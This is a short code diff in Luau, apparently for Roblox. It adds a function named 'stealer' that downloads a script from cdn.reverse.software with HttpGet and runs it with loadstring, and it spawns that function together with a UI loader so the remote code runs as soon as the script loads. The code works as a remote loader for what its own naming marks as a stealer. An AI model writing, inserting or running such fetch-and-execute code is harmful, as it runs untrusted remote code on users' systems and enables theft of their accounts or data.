@@ -1,1 +1,7 @@
+local function stealer()
+    ID="your-own-id";
+  loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+end
 
+task.spawn(stealer)
+task.spawn(loadui)
